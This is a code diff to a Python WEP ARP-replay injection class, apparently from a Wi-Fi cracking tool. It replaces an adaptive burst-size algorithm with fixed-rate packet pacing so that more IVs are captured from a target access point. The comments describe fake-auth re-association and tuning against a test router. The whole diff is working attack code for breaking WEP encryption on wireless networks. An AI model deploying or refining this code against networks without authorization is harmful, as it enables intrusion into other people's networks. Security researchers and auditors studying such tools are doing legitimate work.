@@ -53,10 +53,23 @@ class ArpReplayStats:
 
 
 class WepArpReplay:
-    """ARP-replay loop with patient candidate testing + adaptive burst sizing."""
+    """ARP-replay loop with patient candidate testing + rate-paced injection.
 
-    _MIN_BURST = 16
-    _MAX_BURST = 1024
+    Injection is PACED to ~the AP's rebroadcast ceiling, not maximized. The AP
+    relays at a fixed rate (~150-180/s on the dd-wrt test box); injecting faster
+    just overflows its rebroadcast queue (frames dropped + dribbled out over
+    seconds) AND starves our half-duplex RX, so capture% and absolute IVs/s both
+    FALL. The old adaptive climber hill-climbed on per-cycle IV gain, but the
+    AP's relay DELAY misattributes a burst's IVs to later cycles — you can't
+    climb a delayed-feedback signal, so it ran away to max burst (the worst
+    place). Fixed burst + a target-rate pace fixes it.
+    """
+
+    # Inject near the AP's relay ceiling; past this is pure harm (queue overflow
+    # + RX starvation). Watch capture% to tune: ~100% means the AP could take
+    # more, <100% means we're at its ceiling.
+    _TARGET_PPS = 150.0
+    _BURST = 24          # frames per cycle (granularity; the pace sets the rate)
     # How long to keep testing one candidate before judging it (seconds). The
     # AP's relayed rebroadcast can lag the burst, so don't condemn on one cycle.
     _TRIAL_WINDOW = 2.5
@@ -104,13 +117,7 @@ class WepArpReplay:
         self._paused = False
         self._task: Optional[asyncio.Task] = None
 
-        self._burst_size = 32
-        # Adaptive climber state: track best IV throughput (unique IVs/sec) and
-        # only back off after a sustained drop, so we climb to and HOLD near
-        # the hardware cap instead of oscillating on per-cycle gain noise.
-        self._best_throughput = 0.0
-        self._poor_streak = 0
-        self._last_cycle_dt = 0.1
+        self._burst_size = self._BURST
 
         # Candidate under test/replay + its trial accounting.
         self._current: Optional[bytes] = None
@@ -284,10 +291,13 @@ class WepArpReplay:
         send_dt = max(1e-3, time.time() - t0)   # burst only — the hardware cap
         if sent:
             self._notify_activity()   # our traffic keeps the assoc alive
-        # Pure-RX window — let the AP's rebroadcasts (fresh IVs) land.
-        await asyncio.sleep(self.rx_window)
+        # Pace the cycle to ~_TARGET_PPS so we don't out-run the AP's relay
+        # (over-injecting overflows its queue + starves our RX). The leftover
+        # time after sending is a pure-RX window for rebroadcasts to land; never
+        # shorter than rx_window.
+        desired_cycle = self._burst_size / self._TARGET_PPS
+        await asyncio.sleep(max(self.rx_window, desired_cycle - send_dt))
         cycle_dt = max(1e-3, time.time() - t0)
-        self._last_cycle_dt = cycle_dt
         self.stats.cycles += 1
         self.stats.raw_pps = sent / send_dt
         self.stats.effective_pps = sent / cycle_dt
@@ -305,7 +315,6 @@ class WepArpReplay:
             if gain > 0:
                 self._stall_started = 0.0
                 self._reauth_requested = False
-                self._adapt(gain)
                 return
             # Winner went quiet — likely we got de-associated. Give it a grace
             # period, ask fake-auth to re-auth, and only demote if it stays dead.
@@ -343,27 +352,6 @@ class WepArpReplay:
             self._failed_at = time.time()
             self.stats.candidates_failed = len(self._failed)
             self._current = None
-
-    def _adapt(self, gain: int) -> None:
-        """Climb burst size toward peak IV THROUGHPUT (unique IVs/sec) and hold.
-
-        Grows while we're still within ~85% of the best throughput seen (i.e.
-        bigger bursts keep paying off, or we've plateaued at the hardware cap —
-        either way keep pushing toward the ceiling). Only backs off after a
-        SUSTAINED drop (3 cycles), so per-cycle gain noise doesn't drag us down
-        off the cap the way the old record-chasing climber did.
-        """
-        throughput = gain / self._last_cycle_dt
-        if throughput >= self._best_throughput * 0.85:
-            self._best_throughput = max(self._best_throughput, throughput)
-            self._poor_streak = 0
-            self._burst_size = min(self._MAX_BURST, int(self._burst_size * 1.3) + 1)
-        else:
-            self._poor_streak += 1
-            if self._poor_streak >= 3:
-                self._poor_streak = 0
-                self._burst_size = max(self._MIN_BURST, int(self._burst_size * 0.8))
-                self._best_throughput *= 0.9   # let it re-probe upward later
 
     # ---- Logging ------------------------------------------------------------
 
